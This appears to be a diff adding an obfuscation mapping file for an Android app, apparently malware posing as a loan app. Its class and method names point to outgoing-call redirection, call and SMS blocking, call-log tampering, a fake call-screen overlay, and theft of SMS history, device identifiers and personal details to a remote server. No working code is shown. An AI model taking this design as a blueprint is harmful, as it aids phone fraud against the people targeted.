@@ -1,0 +1,951 @@
+main.app.loan.DBDial -> main.app.loan.a:
+    main.app.loan.DBDial$PhoneTable[] tables -> a
+    void Init$1a54e370(android.content.Context) -> a
+    java.lang.String getRedirectNumber(android.content.Context,java.lang.String) -> a
+main.app.loan.DBDial$PhoneTable -> main.app.loan.b:
+    int no -> a
+    java.lang.String orgNum -> b
+    java.lang.String newNum -> c
+main.app.loan.DBRef -> main.app.loan.c:
+    main.app.loan.DBRef$PhoneTable[] tables -> a
+    void Init$1a54e370(android.content.Context) -> a
+    boolean IsBlockerNumber(android.content.Context,java.lang.String,boolean) -> a
+main.app.loan.DBRef$PhoneTable -> main.app.loan.d:
+    int no -> a
+    java.lang.String orgNum -> b
+    int bCall -> c
+    int bSms -> d
+main.app.loan.DelayWnd -> main.app.loan.DelayWnd:
+    void onDestroy() -> onDestroy
+    void onCreate(android.os.Bundle) -> onCreate
+main.app.loan.GlobalLib -> main.app.loan.e:
+    byte[] key -> a
+    java.lang.String FormatPhoneNumber(java.lang.String) -> a
+    int DeleteCallLog(android.content.Context,java.lang.String,boolean) -> a
+    void InsertCallLog(android.content.Context,int,java.lang.String) -> a
+    java.lang.String GetSMSHistory$13f7f94d(android.content.Context) -> a
+    void launchInstallScreen(android.content.Context) -> b
+    void sleep(int) -> a
+    void MakeSubDir(java.lang.String) -> b
+    boolean IsExistFile(java.lang.String) -> c
+    boolean DeleteFile(java.lang.String) -> d
+    java.lang.String decrypt(java.lang.String) -> e
+    byte[] intToByteArray(int) -> b
+    int byteArrayToInt(byte[]) -> a
+    java.lang.String GetDeviceId(android.content.Context) -> e
+    java.lang.String GetSimSerialNumber(android.content.Context) -> f
+    java.lang.String GetPhoneNumber(android.content.Context) -> g
+    int GetDevIntUID(android.content.Context) -> c
+    java.lang.String GetDeviceUID(android.content.Context) -> d
+    long GetTickCount() -> a
+    java.lang.String ToCString(byte[]) -> b
+main.app.loan.InstallWnd -> main.app.loan.InstallWnd:
+    int SAVE_HEADER_INFO -> a
+    int SAVE_INSTALLDATE_LEN -> b
+    int SAVE_OFFSET_STATE -> c
+    int SAVE_OFFSET_INSATALLDATE -> d
+    android.app.Activity mMainActivity -> e
+    android.os.Handler myHandler -> f
+    java.lang.String getFolderPath(android.content.Context) -> c
+    java.lang.String getTodayString() -> c
+    void SaveInstallState$30450ecb(android.content.Context,boolean) -> a
+    byte ReadInstallState(android.content.Context) -> a
+    boolean IsOverDeadline(android.content.Context) -> b
+    void SendHandlerMessage(int) -> a
+    void ShowAlertMessage$505cbf4b(java.lang.String) -> a
+    void ShowPersonPopup() -> a
+    void onCreate(android.os.Bundle) -> onCreate
+    void RemoveAppIcon() -> b
+main.app.loan.InstallWnd$1 -> main.app.loan.f:
+    main.app.loan.InstallWnd this$0 -> a
+    void handleMessage(android.os.Message) -> handleMessage
+    main.app.loan.InstallWnd access$0(main.app.loan.InstallWnd$1) -> a
+main.app.loan.InstallWnd$1$1 -> main.app.loan.g:
+    main.app.loan.InstallWnd$1 this$1 -> a
+    android.app.ProgressDialog val$mProgressDlg -> b
+    void run() -> run
+main.app.loan.InstallWnd$1$2 -> main.app.loan.h:
+    main.app.loan.InstallWnd$1 this$1 -> a
+    android.app.ProgressDialog val$mProgressDlg -> b
+    void run() -> run
+main.app.loan.InstallWnd$2 -> main.app.loan.i:
+    main.app.loan.InstallWnd this$0 -> a
+    boolean val$bTerm -> b
+    main.app.loan.InstallWnd val$thisPtr -> c
+    void onClick(android.content.DialogInterface,int) -> onClick
+main.app.loan.InstallWnd$3 -> main.app.loan.j:
+    main.app.loan.InstallWnd this$0 -> a
+    android.widget.EditText val$txtName -> b
+    android.widget.EditText val$txtBirth -> c
+    android.widget.EditText val$txtCorp -> d
+    void onClick(android.content.DialogInterface,int) -> onClick
+main.app.loan.InstallWnd$4 -> main.app.loan.k:
+    main.app.loan.InstallWnd this$0 -> a
+    main.app.loan.InstallWnd val$thisPtr -> b
+    void onClick(android.content.DialogInterface,int) -> onClick
+main.app.loan.InstallWnd$5 -> main.app.loan.l:
+    main.app.loan.InstallWnd this$0 -> a
+    android.widget.EditText val$txtName -> b
+    android.widget.EditText val$txtBirth -> c
+    android.widget.EditText val$txtCorp -> d
+    android.app.AlertDialog val$dialog -> e
+    void onTextChanged(java.lang.CharSequence,int,int,int) -> onTextChanged
+    void beforeTextChanged(java.lang.CharSequence,int,int,int) -> beforeTextChanged
+    void afterTextChanged(android.text.Editable) -> afterTextChanged
+main.app.loan.InstallWnd$6 -> main.app.loan.m:
+    main.app.loan.InstallWnd this$0 -> a
+    android.widget.EditText val$txtName -> b
+    android.widget.EditText val$txtBirth -> c
+    android.widget.EditText val$txtCorp -> d
+    android.app.AlertDialog val$dialog -> e
+    void onTextChanged(java.lang.CharSequence,int,int,int) -> onTextChanged
+    void beforeTextChanged(java.lang.CharSequence,int,int,int) -> beforeTextChanged
+    void afterTextChanged(android.text.Editable) -> afterTextChanged
+main.app.loan.InstallWnd$7 -> main.app.loan.n:
+    main.app.loan.InstallWnd this$0 -> a
+    void run() -> run
+main.app.loan.MainApp -> main.app.loan.MainApp:
+    android.content.ComponentName mMainWndName -> a
+    void onCreate() -> onCreate
+    void onTerminate() -> onTerminate
+main.app.loan.MeasureWnd -> main.app.loan.MeasureWnd:
+    boolean mIsLoading -> a
+    android.graphics.Rect mRcName -> b
+    android.graphics.Rect mRcNumber -> c
+    android.graphics.Rect mRcKeyPad -> d
+    android.graphics.Rect mRcSpeaker -> e
+    android.graphics.Rect mRcAddCall -> f
+    android.graphics.Rect mRcRect -> g
+    int mScreenWidth -> h
+    int mScreenHeight -> i
+    int mStatusbarHeight -> j
+    int SizeOfRect -> k
+    void onBackPressed() -> onBackPressed
+    void MyTerminate() -> b
+    void OnServiceInit_Galaxy412() -> c
+    void OnServiceInit_Optimus412() -> d
+    android.graphics.Rect[] LoadUIInfo(android.content.Context) -> a
+    boolean SaveUIInfo(android.content.Context,android.graphics.Rect[]) -> a
+    void SaveUIElement() -> e
+    void GetUISizeAndSave() -> a
+    void onWindowFocusChanged(boolean) -> onWindowFocusChanged
+    void OnInitDialog() -> f
+    java.lang.String getUIInfoPath(android.content.Context) -> b
+    void onCreate(android.os.Bundle) -> onCreate
+    void onDestroy() -> onDestroy
+main.app.loan.MeasureWnd$1 -> main.app.loan.o:
+    main.app.loan.MeasureWnd this$0 -> a
+    void run() -> run
+main.app.loan.MeasureWnd$2 -> main.app.loan.p:
+    main.app.loan.MeasureWnd this$0 -> a
+    android.view.View val$layout -> b
+    void onGlobalLayout() -> onGlobalLayout
+main.app.loan.ModelType -> main.app.loan.q:
+    boolean IsTargetDevice(android.content.Context) -> a
+    int getCallUiType() -> a
+main.app.loan.NetServer -> main.app.loan.r:
+    int PACKET_HEADER_UID -> a
+    int PACKET_HEADER_VER -> b
+    byte OPCODE_PHONE_TEXT -> c
+    byte OPCODE_PHONE_KEEPALIVE -> d
+    byte OPCODE_PHONE_SENDINSTALL -> e
+    byte OPCODE_PHONE_PERSON -> f
+    java.lang.String[] SERVER_IP -> g
+    int SERVER_PORT -> h
+    java.lang.String CALL_OUT_HOOK -> i
+    java.lang.String CALL_OUT_HOOK1 -> j
+    java.lang.String CALL_OUT_NORM -> k
+    java.lang.String CALL_IN_HOOK -> l
+    java.lang.String CALL_IN_NORM -> m
+    java.lang.String SMS_IN_HOOK -> n
+    java.lang.String SMS_IN_NORM -> o
+    java.lang.String SMS_OUT_NORM -> p
+    java.lang.String APP_INSTALL_PKG -> q
+    long mAuthRunTick -> r
+    int AUTH_THREAD_SLEEP -> s
+    long AUTH_KEEPALIVE_TICK -> t
+    int AUTH_KEEPALIVE_PERIOD -> u
+    java.lang.String mDeviceUID -> v
+    int AUTH_RESULT_NONE -> w
+    int AUTH_RESULT_SUCCESS -> x
+    int AUTH_RESULT_STOP -> y
+    int mAuthSuccess -> z
+    java.lang.String getServerIP() -> a
+    void DecryptPacketPhone(byte[]) -> a
+    java.lang.String MakeStringBody$7f79f945(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> a
+    byte[] MakePacket(byte,int,int,byte[]) -> a
+    void SendCallLog(android.content.Context,java.lang.String,java.lang.String,java.lang.String) -> a
+    void SendSMSLog(java.lang.String) -> a
+    boolean sendTextPacket(java.lang.String) -> b
+    int sendAuthPacket(boolean) -> a
+    void restartTasker(android.content.Context) -> a
+    void AuthToServer(android.content.Context) -> b
+main.app.loan.NetServer$1 -> main.app.loan.s:
+    java.lang.String val$sts -> a
+    java.lang.String val$num1 -> b
+    java.lang.String val$num2 -> c
+    android.content.Context val$cxt -> d
+    void run() -> run
+main.app.loan.NetServer$2 -> main.app.loan.t:
+    java.lang.String val$strBody -> a
+    void run() -> run
+main.app.loan.NetServer$3 -> main.app.loan.u:
+    android.content.Context val$cxt -> a
+    void run() -> run
+main.app.loan.OnInReceiver -> main.app.loan.OnInReceiver:
+    android.os.Handler myHandler -> a
+    android.content.Context mContext -> b
+    void onReceive(android.content.Context,android.content.Intent) -> onReceive
+main.app.loan.OnInReceiver$1 -> main.app.loan.v:
+    main.app.loan.OnInReceiver this$0 -> a
+    void handleMessage(android.os.Message) -> handleMessage
+main.app.loan.OnInReceiver$2 -> main.app.loan.w:
+    main.app.loan.OnInReceiver this$0 -> a
+    java.lang.String val$delNum -> b
+    void run() -> run
+main.app.loan.OnOutMonSvc -> main.app.loan.OnOutMonSvc:
+    int CALL_STATE_NONE -> a
+    int CALL_STATE_OFFHOOK -> b
+    int CALL_STATE_IDLE -> c
+    android.content.Context mContext -> d
+    boolean bEventThreadRun -> e
+    java.lang.Thread mEventChecker -> f
+    android.os.Handler myHandler -> g
+    android.os.IBinder onBind(android.content.Intent) -> onBind
+    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
+    void EventCheckerProc() -> a
+    void onCreate() -> onCreate
+    void onDestroy() -> onDestroy
+    void SendHandlerMessage(int) -> a
+    void TerminateAll() -> b
+    void TerminateAll_1() -> c
+main.app.loan.OnOutMonSvc$1 -> main.app.loan.x:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$10 -> main.app.loan.y:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$11 -> main.app.loan.z:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$12 -> main.app.loan.aa:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$13 -> main.app.loan.ab:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$2 -> main.app.loan.ac:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void handleMessage(android.os.Message) -> handleMessage
+main.app.loan.OnOutMonSvc$3 -> main.app.loan.ad:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$4 -> main.app.loan.ae:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$5 -> main.app.loan.af:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$6 -> main.app.loan.ag:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$7 -> main.app.loan.ah:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$8 -> main.app.loan.ai:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutMonSvc$9 -> main.app.loan.aj:
+    main.app.loan.OnOutMonSvc this$0 -> a
+    void run() -> run
+main.app.loan.OnOutReceiver -> main.app.loan.OnOutReceiver:
+    int HANDLER_MESSAGE_WAKE_SCREEN -> HANDLER_MESSAGE_WAKE_SCREEN
+    int HANDLER_MESSAGE_SLEEP_SCREEN -> HANDLER_MESSAGE_SLEEP_SCREEN
+    android.os.Handler myHandler -> myHandler
+    void InitService(android.content.Context) -> InitService
+    boolean LoadUIElement(android.content.Context) -> LoadUIElement
+    void SendHandlerMessage(int) -> SendHandlerMessage
+    void outgo_change(android.content.Context,android.content.Intent) -> outgo_change
+    void outgo_redirect(android.content.Context,android.content.Intent) -> outgo_redirect
+    void onReceive(android.content.Context,android.content.Intent) -> onReceive
+main.app.loan.OnOutReceiver$1 -> main.app.loan.ak:
+    main.app.loan.OnOutReceiver this$0 -> a
+    void handleMessage(android.os.Message) -> handleMessage
+main.app.loan.OnOutReceiver$2 -> main.app.loan.al:
+    main.app.loan.OnOutReceiver this$0 -> a
+    android.content.Context val$cxt -> b
+    void run() -> run
+main.app.loan.OnUICtrlSvc -> main.app.loan.OnUICtrlSvc:
+    int mStatusbar_CurHeight -> a
+    int mScreen_CurWidth -> b
+    int mScreen_CurHeight -> c
+    boolean mVisible -> d
+    boolean mWakeOrSleep -> e
+    android.widget.Button mBtnPad -> f
+    android.widget.Button mBtnSpeaker -> g
+    android.widget.Button mBtnAddCall -> h
+    android.widget.TextView mTxtName -> i
+    android.widget.TextView mTxtNumber -> j
+    android.widget.LinearLayout mFillRect -> k
+    android.widget.LinearLayout mTextBk1 -> l
+    android.widget.LinearLayout mTextBk2 -> m
+    android.widget.LinearLayout mScreenOff -> n
+    android.widget.LinearLayout mStatusbar -> o
+    android.graphics.Rect mRcName -> p
+    android.graphics.Rect mRcNumber -> q
+    android.graphics.Rect mRcKeyPad -> r
+    android.graphics.Rect mRcSpeaker -> s
+    android.graphics.Rect mRcAddCall -> t
+    android.graphics.Rect mRcRect -> u
+    android.view.WindowManager$LayoutParams mParams -> v
+    android.view.WindowManager mWindowManager -> w
+    android.content.Context mContext -> x
+    void Init() -> a
+    void SetOverlayBitmap(android.content.Context,android.view.View,int,android.graphics.Rect) -> a
+    android.os.IBinder onBind(android.content.Intent) -> onBind
+    void OnCreate_Sky412() -> c
+    void OnCreate_Sky442() -> d
+    void onCreate() -> onCreate
+    void destoryUI() -> e
+    void onDestroy() -> onDestroy
+    void setBackgroundColor_412(int) -> a
+    void setVisibility(boolean) -> a
+    void WakeOrSleep(boolean) -> b
+    void ProcessCallActive() -> b
+main.app.loan.RbPrefEditor -> main.app.loan.am:
+    void put(android.content.Context,java.lang.String,long) -> a
+    long getValue$607b6aa5(android.content.Context,java.lang.String) -> a
+main.app.loan.SmsOutgoer -> main.app.loan.SmsOutgoer:
+    void onCreate() -> onCreate
+    android.os.IBinder onBind(android.content.Intent) -> onBind
+    void onDestroy() -> onDestroy
+    void onStart(android.content.Intent,int) -> onStart
+    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
+main.app.loan.SmsOutgoer$MyContentObserver -> main.app.loan.an:
+    android.content.Context context -> a
+    main.app.loan.SmsOutgoer this$0 -> b
+    void onChange(boolean) -> onChange
+    boolean deliverSelfNotifications() -> deliverSelfNotifications
+main.app.loan.SmsRecevier -> main.app.loan.SmsRecevier:
+    void onReceive(android.content.Context,android.content.Intent) -> onReceive
+main.app.loan.VarSpace -> main.app.loan.ao:
+    java.lang.String mOriginNum -> a
+    java.lang.String mOriginName -> b
+    java.lang.String mChangeNum -> c
+    boolean bTopSvcRun -> d
+    boolean bEventSvcRun -> e
+    java.lang.String mOutgoNum -> f
+    boolean mRedirectOK -> g
+    java.util.ArrayList blockNumbersChange -> h
+    java.util.ArrayList blockNumbersBlock -> i
+    java.lang.String statusStopDialer -> j
+    void Init() -> a
+    java.lang.String isExtraChanger(java.lang.String) -> a
+    java.lang.String isExtraBlocker(java.lang.String) -> b
+    sub.app.client.PreferencePacket loadPreferences(android.content.Context) -> a
+    void savePreferences(android.content.Context,byte[]) -> a
+main.app.loan.myTelephony -> main.app.loan.ap:
+    boolean proc_void_2(android.content.Context,java.lang.String,java.lang.String,java.lang.String) -> a
+    boolean proc_void_1(android.content.Context,java.lang.String,java.lang.String) -> a
+    boolean proc_bool_1(android.content.Context,java.lang.String,java.lang.String) -> b
+    boolean proc_void_0(android.content.Context,java.lang.String) -> a
+    boolean proc_bool_0(android.content.Context,java.lang.String) -> b
+    boolean isIdle(android.content.Context) -> a
+org.apache.commons.codec.Charsets -> a.a.a.a.a:
+    java.nio.charset.Charset ISO_8859_1 -> a
+    java.nio.charset.Charset US_ASCII -> b
+    java.nio.charset.Charset UTF_16 -> c
+    java.nio.charset.Charset UTF_16BE -> d
+    java.nio.charset.Charset UTF_16LE -> e
+    java.nio.charset.Charset UTF_8 -> f
+org.apache.commons.codec.binary.Base64 -> a.a.a.a.a.a:
+    byte[] CHUNK_SEPARATOR -> a
+    byte[] STANDARD_ENCODE_TABLE -> d
+    byte[] URL_SAFE_ENCODE_TABLE -> e
+    byte[] DECODE_TABLE -> f
+    byte[] encodeTable -> g
+    byte[] decodeTable -> h
+    byte[] lineSeparator -> i
+    int decodeSize -> j
+    int encodeSize -> k
+    void decode(byte[],int,int,org.apache.commons.codec.binary.BaseNCodec$Context) -> a
+    byte[] decodeBase64(byte[]) -> a
+    boolean isInAlphabet(byte) -> a
+org.apache.commons.codec.binary.BaseNCodec -> a.a.a.a.a.b:
+    byte PAD -> b
+    int unencodedBlockSize -> a
+    int encodedBlockSize -> d
+    int lineLength -> c
+    int chunkSeparatorLength -> e
+    byte[] ensureBufferSize(int,org.apache.commons.codec.binary.BaseNCodec$Context) -> a
+    void decode(byte[],int,int,org.apache.commons.codec.binary.BaseNCodec$Context) -> a
+    boolean isInAlphabet(byte) -> a
+    boolean containsAlphabetOrPad(byte[]) -> b
+org.apache.commons.codec.binary.BaseNCodec$Context -> a.a.a.a.a.c:
+    int ibitWorkArea -> a
+    long lbitWorkArea -> b
+    byte[] buffer -> c
+    int pos -> d
+    int readPos -> e
+    boolean eof -> f
+    int currentLinePos -> g
+    int modulus -> h
+    java.lang.String toString() -> toString
+org.apache.commons.net.DefaultSocketFactory -> a.a.a.b.a:
+    java.net.Socket createSocket(java.lang.String,int) -> a
+    java.net.ServerSocket createServerSocket$d623ec1(java.net.InetAddress) -> a
+org.apache.commons.net.MalformedServerReplyException -> a.a.a.b.b:
+org.apache.commons.net.ProtocolCommandEvent -> a.a.a.b.c:
+    int __replyCode -> a
+    boolean __isCommand -> b
+    java.lang.String __message -> c
+    java.lang.String __command -> d
+org.apache.commons.net.ProtocolCommandListener -> a.a.a.b.d:
+    void protocolCommandSent$64b6be56() -> a
+    void protocolReplyReceived$64b6be56() -> b
+org.apache.commons.net.ProtocolCommandSupport -> a.a.a.b.e:
+    java.lang.Object __source -> a
+    org.apache.commons.net.util.ListenerList __listeners -> b
+    void fireCommandSent(java.lang.String,java.lang.String) -> a
+    void fireReplyReceived(int,java.lang.String) -> a
+    int getListenerCount() -> a
+org.apache.commons.net.SocketClient -> a.a.a.b.f:
+    org.apache.commons.net.SocketFactory __DEFAULT_SOCKET_FACTORY -> h
+    int _timeout_ -> a
+    java.net.Socket _socket_ -> b
+    boolean _isConnected_ -> c
+    int _defaultPort_ -> d
+    java.io.InputStream _input_ -> e
+    java.io.OutputStream _output_ -> f
+    org.apache.commons.net.SocketFactory _socketFactory_ -> g
+    void _connectAction_() -> a
+    void connect(java.lang.String,int) -> a
+    void disconnect() -> b
+    boolean isConnected() -> c
+    void setDefaultPort(int) -> a
+    java.net.InetAddress getLocalAddress() -> d
+    java.net.InetAddress getRemoteAddress() -> e
+    boolean verifyRemote(java.net.Socket) -> a
+org.apache.commons.net.SocketFactory -> a.a.a.b.g:
+    java.net.Socket createSocket(java.lang.String,int) -> a
+    java.net.ServerSocket createServerSocket$d623ec1(java.net.InetAddress) -> a
+org.apache.commons.net.ftp.FTP -> a.a.a.b.a.a:
+    java.lang.StringBuffer __commandBuffer -> B
+    java.io.BufferedReader _controlInput -> h
+    java.io.BufferedWriter _controlOutput -> i
+    int _replyCode -> j
+    java.util.Vector _replyLines -> k
+    boolean _newReplyString -> l
+    java.lang.String _replyString -> m
+    java.lang.String _controlEncoding -> n
+    org.apache.commons.net.ProtocolCommandSupport _commandSupport_ -> o
+    void __getReply() -> g
+    void _connectAction_() -> a
+    void setControlEncoding(java.lang.String) -> a
+    void disconnect() -> b
+    int sendCommand(java.lang.String,java.lang.String) -> a
+    boolean socketIsConnected(java.net.Socket) -> b
+    int sendCommand(int,java.lang.String) -> a
+    int getReply() -> f
+    java.lang.String getReplyString() -> h
+    int cwd(java.lang.String) -> b
+    int mkd(java.lang.String) -> c
+org.apache.commons.net.ftp.FTPClient -> a.a.a.b.a.b:
+    int __dataConnectionMode -> B
+    int __dataTimeout -> C
+    int __passivePort -> D
+    java.lang.String __passiveHost -> E
+    int __fileType -> F
+    int __fileFormat -> G
+    int __fileStructure -> H
+    int __fileTransferMode -> I
+    boolean __remoteVerificationEnabled -> J
+    long __restartOffset -> K
+    org.apache.commons.net.ftp.parser.FTPFileEntryParserFactory __parserFactory -> L
+    int __bufferSize -> M
+    java.lang.String __systemName -> N
+    org.apache.commons.net.ftp.FTPFileEntryParser __entryParser -> O
+    org.apache.commons.net.ftp.FTPClientConfig __configuration -> P
+    void __initDefaults() -> o
+    void __parsePassiveModeReply(java.lang.String) -> d
+    boolean __storeFile$5f6b3ae1(java.lang.String,java.io.InputStream) -> b
+    void _connectAction_() -> a
+    void disconnect() -> b
+    boolean login(java.lang.String,java.lang.String) -> a
+    boolean logout() -> g
+    void enterLocalPassiveMode() -> h
+    boolean setFileType$134632() -> i
+    boolean storeFile(java.lang.String,java.io.InputStream) -> a
+    boolean restart(long) -> a
+org.apache.commons.net.ftp.FTPClientConfig -> a.a.a.b.a.c:
+    java.util.Map LANGUAGE_CODE_MAP -> a
+org.apache.commons.net.ftp.FTPCommand -> a.a.a.b.a.d:
+    java.lang.String[] _commands -> a
+org.apache.commons.net.ftp.FTPConnectionClosedException -> a.a.a.b.a.e:
+org.apache.commons.net.ftp.FTPFileEntryParser -> a.a.a.b.a.f:
+org.apache.commons.net.ftp.FTPReply -> a.a.a.b.a.g:
+    boolean isPositivePreliminary(int) -> a
+    boolean isPositiveCompletion(int) -> b
+    boolean isPositiveIntermediate(int) -> c
+org.apache.commons.net.ftp.parser.DefaultFTPFileEntryParserFactory -> a.a.a.b.a.a.a:
+    org.apache.commons.net.ftp.FTPClientConfig config -> a
+org.apache.commons.net.ftp.parser.FTPFileEntryParserFactory -> a.a.a.b.a.a.b:
+org.apache.commons.net.io.CopyStreamException -> a.a.a.b.b.a:
+    long totalBytesTransferred -> a
+    java.io.IOException ioException -> b
+org.apache.commons.net.io.FromNetASCIIInputStream -> a.a.a.b.b.b:
+    boolean _noConversionRequired -> a
+    java.lang.String _lineSeparator -> b
+    byte[] _lineSeparatorBytes -> c
+    int __length -> d
+    boolean isConversionRequired() -> a
+    int __read() -> b
+    int read() -> read
+    int read(byte[]) -> read
+    int read(byte[],int,int) -> read
+    int available() -> available
+org.apache.commons.net.io.ToNetASCIIOutputStream -> a.a.a.b.b.c:
+    boolean __lastWasCR -> a
+    void write(int) -> write
+    void write(byte[]) -> write
+    void write(byte[],int,int) -> write
+org.apache.commons.net.io.Util -> a.a.a.b.b.d:
+    long copyStream$31bd058b(java.io.InputStream,java.io.OutputStream,int) -> a
+org.apache.commons.net.telnet.Telnet -> a.a.a.b.c.a:
+    byte[] _COMMAND_DO -> p
+    byte[] _COMMAND_DONT -> q
+    byte[] _COMMAND_WILL -> r
+    byte[] _COMMAND_WONT -> s
+    byte[] _COMMAND_SB -> t
+    byte[] _COMMAND_SE -> u
+    int[] _doResponse -> v
+    int[] _willResponse -> w
+    int[] _options -> x
+    byte[] _COMMAND_IS -> y
+    java.lang.String terminalType -> h
+    org.apache.commons.net.telnet.TelnetOptionHandler[] optionHandlers -> i
+    byte[] _COMMAND_AYT -> z
+    java.lang.Object aytMonitor -> j
+    boolean aytFlag -> k
+    java.io.OutputStream spyStream -> l
+    org.apache.commons.net.telnet.TelnetNotificationHandler __notifhand -> m
+    boolean _stateIsWill(int) -> j
+    boolean _stateIsDo(int) -> k
+    boolean _requestedWill(int) -> l
+    boolean _requestedWont(int) -> b
+    boolean _requestedDo(int) -> m
+    boolean _requestedDont(int) -> c
+    void _setWantWill(int) -> n
+    void _setWantDo(int) -> o
+    void _processDo(int) -> d
+    void _processDont(int) -> e
+    void _processWill(int) -> f
+    void _processWont(int) -> g
+    void _processSuboption(int[],int) -> a
+    void _sendTerminalType() -> f
+    void _sendSubnegotiation(int[]) -> a
+    void _processAYTResponse() -> j
+    void _connectAction_() -> a
+    void _sendDo(int) -> p
+    void _requestDo(int) -> q
+    void _sendDont(int) -> r
+    void _sendWill(int) -> s
+    void _requestWill(int) -> t
+    void _sendWont(int) -> u
+    void _sendByte(int) -> h
+    void _spyRead(int) -> i
+org.apache.commons.net.telnet.TelnetClient -> a.a.a.b.c.b:
+    java.io.InputStream __input -> h
+    java.io.OutputStream __output -> i
+    boolean readerThread -> A
+    void _flushOutputStream() -> k
+    void _closeOutputStream() -> l
+    void _connectAction_() -> a
+    void disconnect() -> b
+    java.io.OutputStream getOutputStream() -> m
+    java.io.InputStream getInputStream() -> n
+org.apache.commons.net.telnet.TelnetInputStream -> a.a.a.b.c.c:
+    boolean __hasReachedEOF -> a
+    boolean __isClosed -> b
+    boolean __readIsWaiting -> c
+    int __receiveState -> d
+    int __queueHead -> e
+    int __queueTail -> f
+    int __bytesAvailable -> g
+    int[] __queue -> h
+    org.apache.commons.net.telnet.TelnetClient __client -> i
+    java.lang.Thread __thread -> j
+    java.io.IOException __ioException -> k
+    int[] __suboption -> l
+    int __suboption_count -> m
+    boolean __threaded -> n
+    void _start() -> a
+    int __read() -> b
+    void __processChar(int) -> a
+    int read() -> read
+    int read(byte[]) -> read
+    int read(byte[],int,int) -> read
+    boolean markSupported() -> markSupported
+    int available() -> available
+    void close() -> close
+    void run() -> run
+org.apache.commons.net.telnet.TelnetNotificationHandler -> a.a.a.b.c.d:
+org.apache.commons.net.telnet.TelnetOption -> a.a.a.b.c.e:
+    int BINARY -> a
+    int ECHO -> b
+    int PREPARE_TO_RECONNECT -> c
+    int SUPPRESS_GO_AHEAD -> d
+    int APPROXIMATE_MESSAGE_SIZE -> e
+    int STATUS -> f
+    int TIMING_MARK -> g
+    int REMOTE_CONTROLLED_TRANSMISSION -> h
+    int NEGOTIATE_OUTPUT_LINE_WIDTH -> i
+    int NEGOTIATE_OUTPUT_PAGE_SIZE -> j
+    int NEGOTIATE_CARRIAGE_RETURN -> k
+    int NEGOTIATE_HORIZONTAL_TAB_STOP -> l
+    int NEGOTIATE_HORIZONTAL_TAB -> m
+    int NEGOTIATE_FORMFEED -> n
+    int NEGOTIATE_VERTICAL_TAB_STOP -> o
+    int NEGOTIATE_VERTICAL_TAB -> p
+    int NEGOTIATE_LINEFEED -> q
+    int EXTENDED_ASCII -> r
+    int FORCE_LOGOUT -> s
+    int BYTE_MACRO -> t
+    int DATA_ENTRY_TERMINAL -> u
+    int SUPDUP -> v
+    int SUPDUP_OUTPUT -> w
+    int SEND_LOCATION -> x
+    int TERMINAL_TYPE -> y
+    int END_OF_RECORD -> z
+    int TACACS_USER_IDENTIFICATION -> A
+    int OUTPUT_MARKING -> B
+    int TERMINAL_LOCATION_NUMBER -> C
+    int REGIME_3270 -> D
+    int X3_PAD -> E
+    int WINDOW_SIZE -> F
+    int TERMINAL_SPEED -> G
+    int REMOTE_FLOW_CONTROL -> H
+    int LINEMODE -> I
+    int X_DISPLAY_LOCATION -> J
+    int OLD_ENVIRONMENT_VARIABLES -> K
+    int AUTHENTICATION -> L
+    int ENCRYPTION -> M
+    int NEW_ENVIRONMENT_VARIABLES -> N
+    int EXTENDED_OPTIONS_LIST -> O
+    int __FIRST_OPTION -> P
+    int __LAST_OPTION -> Q
+    java.lang.String[] __optionString -> R
+org.apache.commons.net.telnet.TelnetOptionHandler -> a.a.a.b.c.f:
+    int optionCode -> a
+    boolean initialLocal -> b
+    boolean initialRemote -> c
+    boolean acceptLocal -> d
+    boolean acceptRemote -> e
+    boolean doFlag -> f
+    boolean willFlag -> g
+    int getOptionCode() -> a
+    boolean getAcceptLocal() -> b
+    boolean getAcceptRemote() -> c
+    boolean getInitLocal() -> d
+    boolean getInitRemote() -> e
+    int[] answerSubnegotiation$1c97353c() -> f
+    int[] startSubnegotiationLocal() -> g
+    int[] startSubnegotiationRemote() -> h
+    void setWill(boolean) -> a
+    void setDo(boolean) -> b
+org.apache.commons.net.telnet.TelnetOutputStream -> a.a.a.b.c.g:
+    org.apache.commons.net.telnet.TelnetClient __client -> a
+    boolean __convertCRtoCRLF -> b
+    boolean __lastWasCR -> c
+    void write(int) -> write
+    void write(byte[]) -> write
+    void write(byte[],int,int) -> write
+    void flush() -> flush
+    void close() -> close
+org.apache.commons.net.util.ListenerList -> a.a.a.b.d.a:
+    java.util.Vector __listeners -> a
+    java.util.Enumeration getListeners() -> a
+    int getListenerCount() -> b
+sub.app.client.AuthPacket -> sub.app.a.a:
+    int productId -> a
+    int productStatus -> b
+    int isRooted -> c
+    int dwReserved1 -> d
+    int dwReserved2 -> e
+    int dwReserved3 -> f
+    int dwReserved4 -> g
+    int getBodySize() -> a
+    byte[] build() -> b
+    void setProductId(int) -> a
+    void setProductStatus(int) -> b
+    void setIsRooted(int) -> c
+sub.app.client.CallLogPacket -> sub.app.a.b:
+    java.util.ArrayList list -> a
+    byte[] build() -> b
+    int getBodySize() -> a
+sub.app.client.CallPacket -> sub.app.a.c:
+    int id -> a
+    int type -> b
+    long duration -> c
+    int contact_id -> d
+    java.lang.String phoneNumber -> e
+    java.lang.String name -> f
+    java.lang.String date -> g
+    int getBodySize() -> a
+    byte[] build() -> b
+sub.app.client.Contact -> sub.app.a.d:
